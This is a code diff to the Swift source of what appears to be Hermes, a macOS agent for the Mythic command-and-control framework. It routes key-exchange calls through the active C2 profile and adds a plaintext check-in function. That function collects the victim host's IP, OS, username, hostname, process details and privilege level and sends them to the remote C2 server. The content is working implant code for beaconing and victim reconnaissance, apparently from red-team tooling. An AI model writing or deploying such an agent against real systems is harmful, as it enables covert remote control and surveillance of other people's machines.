@@ -76,7 +76,7 @@ func encryptedKeyExchange() -> Bool {
     ])
     
     // Send Hermes message, get Mythic response, decrypt and decode
-    //var jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: payloadUUID, decodedAESKey: decodedAESKey, httpMethod: "get") - old HTTP-specific sendHermesMessage function, bypassing the C2 profile manager entirely. Fixed
+    // Uses the profile-agnostic sendHermesMessage that routes through the active C2 profile
     var jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: payloadUUID, decodedAESKey: decodedAESKey)
     
     // Save tempUUID for checkin message
@@ -112,7 +112,7 @@ func encryptedKeyExchange() -> Bool {
     agentConfig.payloadUUID = tempUUID!
     
     // Send Hermes message, get Mythic response, decrypt and decode
-    //jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey.0, httpMethod: "post") - old one, need profile-agnostic sendHermesMessage
+    // Uses the profile-agnostic sendHermesMessage that routes through the active C2 profile
     jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey.0)
     
     // Returned UUID is new payloadUUID
@@ -120,6 +120,47 @@ func encryptedKeyExchange() -> Bool {
     
     // Return true or false based on success
     if (jsonResponse["status"].rawString()! == "success") {
+        return true
+    }
+    else {
+        return false
+    }
+}
+
+// Plaintext checkin without encryption - used when encrypted_exchange_check is false
+func plaintextCheckin() -> Bool {
+    // Get integrity_level
+    var integrityLevel = 2 // standard user
+    if (NSUserName() == "root") {
+        integrityLevel = 4 // root user
+    }
+    
+    // Assemble plaintext json for checkin message
+    let jsonPayload = JSON([
+        "action": "checkin",
+        "ip": getIPAddress(),
+        "os": "macOS \(ProcessInfo.processInfo.operatingSystemVersionString)",
+        "user": NSUserName(),
+        "host": Host.current().localizedName!,
+        "pid": ProcessInfo.processInfo.processIdentifier,
+        "uuid": agentConfig.payloadUUID,
+        "architecture": "x64",
+        "integrity_level": integrityLevel,
+        "process_name": ProcessInfo.processInfo.processName,
+    ])
+    
+    // Send plaintext message through the active C2 profile
+    let jsonResponse = sendPlaintextHermesMessage(jsonMessage: jsonPayload)
+    
+    // Returned UUID is new payloadUUID
+    if let newUUID = jsonResponse["id"].rawString() {
+        agentConfig.payloadUUID = newUUID
+    } else {
+        return false
+    }
+    
+    // Return true or false based on success
+    if (jsonResponse["status"].rawString() == "success") {
         return true
     }
     else {
